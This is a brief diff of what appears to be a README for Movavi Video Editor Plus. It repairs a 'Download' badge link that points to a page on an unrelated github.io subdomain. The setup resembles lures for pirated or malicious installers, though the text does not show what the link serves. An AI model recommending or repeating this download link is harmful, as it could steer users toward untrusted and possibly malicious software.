@@ -56,7 +56,7 @@ Movavi Video Editor Plus is a powerful video editing application designed for us
 
 ---
 
-[![Download Movavi Video Editor Plus](https://img.shields.io/badge/Download-Movavi_Editor_Plus-blueviolet)]([https://asdeennerhorse.github.io/mogus/movavi)
+[![Download Movavi Video Editor Plus](https://img.shields.io/badge/Download-Movavi_Editor_Plus-blueviolet)](https://asdeennerhorse.github.io/mogus/movavi)
 
 ---
 
